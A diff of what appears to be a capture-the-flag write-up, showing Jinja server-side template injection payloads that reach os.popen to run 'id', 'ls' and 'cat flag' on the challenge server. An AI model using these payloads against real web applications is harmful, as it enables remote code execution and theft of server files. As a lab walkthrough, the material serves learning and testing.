@@ -51,9 +51,10 @@ I then announced ``{{request.application.__globals__.__builtins__.__import__('os
 
 <img width="1593" height="192" alt="image" src="https://github.com/user-attachments/assets/a9c4504a-4309-46fc-84c0-4bbef23279d1" />
 
-What this basically did was execute the id command. If I replace id with ls it gives me the following output
+What this basically did was execute the id command. If I replace id with ls ``{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`` it gives me the following output
 
 <img width="1410" height="176" alt="image" src="https://github.com/user-attachments/assets/cbb1be98-e52e-47a8-b8df-e72544cedbb1" />
+
 
 I then tried using ``{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}`` 
 
